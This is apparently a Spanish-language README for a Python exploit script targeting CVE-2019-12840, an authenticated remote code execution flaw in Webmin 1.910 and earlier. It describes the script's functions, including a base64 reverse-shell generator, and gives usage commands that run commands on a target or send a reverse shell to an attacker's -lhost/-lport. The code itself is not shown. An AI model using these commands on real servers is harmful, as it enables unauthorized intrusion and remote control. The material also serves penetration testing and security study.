# Exploit para CVE-2019-12840 en Webmin
Este repositorio contiene un script de Python que explota la vulnerabilidad CVE-2019-12840 en Webmin.

## Descripción
El script intenta iniciar sesión en un servidor Webmin y luego explotar la vulnerabilidad CVE-2019-12840. El script acepta varios argumentos de línea de comandos, incluyendo el nombre de usuario y la contraseña para iniciar sesión en el servidor Webmin, la URL del servidor, el puerto del servidor, el puerto local para el shell reverso, y un comando para ejecutar en el servidor.

## Uso
Para usar este script, debes proporcionar al menos el nombre de usuario, la contraseña y la URL del servidor Webmin. Aquí tienes un ejemplo de cómo usar el script:

```python exploit.py -U username -P password -u http://localhost:10000 -lhost 10.x.x.x -lport 443 ```

## Descripción del Código
El script de Python en este repositorio está estructurado de la siguiente manera:

1. Importación de módulos: El script comienza importando varios módulos de Python necesarios para su funcionamiento. Estos incluyen requests para hacer solicitudes HTTP, argparse para manejar argumentos de línea de comandos, base64 para codificación y decodificación en base64, y BeautifulSoup para analizar HTML.

1. Definición de funciones: El script define varias funciones:

- ```CVE_2019_12840(url,auth_base64,cmd)```: Esta función realiza una solicitud POST a una URL específica con una carga útil específica y verifica la respuesta.
- ```login(username,password,url)```: Esta función intenta iniciar sesión en el servidor Webmin con un nombre de usuario y contraseña proporcionados.
- ```exploit(sid,url,cmd)```: Esta función intenta explotar la vulnerabilidad CVE-2019-12840 en el servidor Webmin.
- ```b64revshell(lhost,lport)```: Esta función genera un shell reverso codificado en base64.
  
3. Manejo de argumentos de línea de comandos: El script acepta varios argumentos de línea de comandos, incluyendo el nombre de usuario y la contraseña para iniciar sesión en el servidor Webmin, la URL del servidor, el puerto del servidor, el puerto local para el shell reverso, y un comando para ejecutar en el servidor.

4. Ejecución del exploit: Si el script se ejecuta como un programa independiente (en lugar de ser importado como un módulo), intentará iniciar sesión en el servidor Webmin y luego ejecutará el exploit.

## Ayuda del Programa
El script acepta varios argumentos de línea de comandos. Aquí tienes un ejemplo de cómo usar el script:

```python3 CVE-2019-12840.py -h```

Esto mostrará la ayuda del programa, que incluye lo siguiente:
```
  _______      ________    ___   ___  __  ___        __ ___   ___  _  _    ___                                      
 / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ |__ \ / _ \| || |  / _ \                                     
| |     \ \  / /| |__ ______ ) | | | || | (_) |______| |  ) | (_) | || |_| | | |                                    
| |      \ \/ / |  __|______/ /| | | || |\__, |______| | / / > _ <|__   _| | | |                                    
| |____   \  /  | |____    / /_| |_| || |  / /       | |/ /_| (_) |  | | | |_| |                                    
 \_____|   \/   |______|  |____|\___/ |_| /_/        |_|____|\___/   |_|  \___/                                     
                                                                                                                    
                           by CyberMonkey                                                                              
                                                                                                                    
             Webmin <= 1.910 RCE (Authorization Required)                                                           
                                                                                                                    
usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -c "id"                                 
usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -lhost <LOCAL_IP> -lport 443            
                                                                                                                    
                                                                                                                    
usage: CVE-2019-12840.py [-h] -U USERNAME -P PASSWORD -u URL [-p PORT] [-lport LPORT] (-c CMD | -lhost LHOST)

options:
  -h, --help    show this help message and exit
  -U USERNAME   username
  -P PASSWORD   password
  -u URL        target url
  -p PORT       target port
  -lport LPORT  local port for reverse shell
  -c CMD        command to execute
  -lhost LHOST  Send back a reverse shell at port 443
```

## Advertencia
Este script es un exploit de seguridad y sólo debe ser utilizado para fines legítimos, como pruebas de penetración o investigación de seguridad. No debe ser utilizado para actividades ilegales. Además, este script está diseñado para ser utilizado con servidores Webmin vulnerables a la CVE-2019-12840, por lo que puede no funcionar con todas las versiones de Webmin.
